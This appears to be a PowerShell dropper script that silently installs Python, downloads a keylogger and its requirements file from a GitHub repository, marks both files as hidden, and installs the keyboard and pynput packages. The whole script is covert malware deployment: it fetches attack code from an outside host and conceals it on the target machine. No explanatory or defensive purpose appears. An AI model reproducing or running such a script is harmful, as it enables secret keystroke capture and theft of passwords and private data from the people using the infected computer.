Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.9/python-3.9.9.exe" -OutFile "C:\Windows\python-3.9.9.exe"
.\Windows\python-3.9.9.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0

$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
python -V

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "keylogger.py"
$HIDE=Get-Item keylogger.py -Force
$HIDE.Attributes="Hidden"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/requirements.txt" -OutFile "requirements.txt"
$HIDE1=Get-Item requirements.txt -Force
$HIDE1.Attributes="Hidden"

pip3 install keyboard
pip3 install pynput

